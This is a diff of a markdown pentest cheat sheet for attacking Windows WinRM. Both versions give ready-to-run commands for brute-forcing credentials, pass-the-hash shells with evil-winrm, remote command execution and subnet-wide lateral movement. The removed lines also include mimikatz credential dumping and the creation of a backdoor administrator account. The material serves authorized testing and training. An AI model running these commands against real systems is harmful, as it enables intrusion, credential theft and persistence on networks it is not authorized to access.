@@ -1,82 +1,50 @@
+# WinRM (5985, 5986)
+
 !!! tip "Start here"
-    `evil-winrm -i <target> -u <user> -p <pass>` is the fastest path to a shell with valid credentials. WinRM runs on port 5985 (HTTP) or 5986 (HTTPS) — check both. Pass-the-hash also works: `evil-winrm -i <target> -u <user> -H <ntlm_hash>`.
+    With valid credentials, connect directly: `evil-winrm -i 10.10.10.10 -u <user> -p <pass>`. Pass-the-hash also works: `evil-winrm -i 10.10.10.10 -u <user> -H <ntlm-hash>`. Port 5985 is HTTP, 5986 is HTTPS — check both.
+
+---
 
 ## Enumeration
-### Check for Open WinRM Ports
-```bash
-nmap -p 5985,5986 --script http-winrm-info,winrm-brute <target-ip>
-```
-
-CrackMapExec:
-```bash
-crackmapexec winrm <target-ip>
-```
-
-Confirm manually using cURL:
-```bash
-curl -vk http://<target-ip>:5985/wsman
-```
-
-A successful response indicates WinRM is active.
-
-## Authentication Attacks
-### Brute-Force Credentials
-CrackMapExec:
-```bash
-crackmapexec winrm <target-ip> -u users.txt -p passwords.txt
-```
-
-MSF:
-```bash
-msfconsole
-use auxiliary/scanner/winrm/winrm_login
-set RHOSTS <target-ip>
-set USER_FILE users.txt
-set PASS_FILE passwords.txt
-run
-```
-
-## Evil-winrm
-```bash
-evil-winrm -i $IP -u user -p password
-```
 
 ```bash
-evil-winrm -i TARGET -u admin -H NTLM_HASH
-```
-### Show WinRM Options
-```
-evil-winrm > menu
+nmap -p 5985,5986 10.10.10.10
+crackmapexec winrm 10.10.10.10
+curl -sk http://10.10.10.10:5985/wsman
 ```
 
-## Post-Exploitation & Lateral Movement
-CrackMapExec for authenticated RCE execution:
+---
+
+## Brute Force
+
 ```bash
-crackmapexec winrm <target-ip> -u <user> -p <password> -x "whoami"
+crackmapexec winrm 10.10.10.10 -u users.txt -p passwords.txt
 ```
 
-Further reconnaissance:
+---
+
+## Shell via evil-winrm
+
 ```bash
-Get-NetComputer -Domain domain.local
-Get-NetUser -Domain domain.local
+evil-winrm -i 10.10.10.10 -u <user> -p <pass>
+evil-winrm -i 10.10.10.10 -u <user> -H <ntlm-hash>
 ```
 
-### Extracting Credentials from Memory
-Once inside, use mimikatz:
-```powershell
-mimikatz # sekurlsa::logonpasswords
+Upload/download files from within the shell:
+
+```
+*Evil-WinRM* PS> upload /path/to/local/file C:\destination
+*Evil-WinRM* PS> download C:\path\to\remote\file /local/destination
 ```
 
-### Adding a New Administrator User
-```powershell
-net user pentest Password123! /add
-net localgroup administrators pentest /add
-```
+---
 
-### Pivoting via WinRM
-DON'T FORGET to try credentials on all targets!
+## Remote Command Execution
 
-Execute commands via CrackMapExec:
 ```bash
-crackmapexec winrm <target-ip> -u <user> -p <password> -x "whoami"
+crackmapexec winrm 10.10.10.10 -u <user> -p <pass> -x "whoami"
+crackmapexec winrm 10.10.10.10 -u <user> -H <ntlm-hash> -x "ipconfig"
 ```
+
+!!! tip "Real-world"
+    WinRM is enabled by default on Windows Server 2012+ and is commonly used for legitimate remote management. If you have valid domain credentials, always check if they work on WinRM across the entire subnet — `crackmapexec winrm 10.10.10.0/24 -u <user> -p <pass>` is a fast lateral movement check.
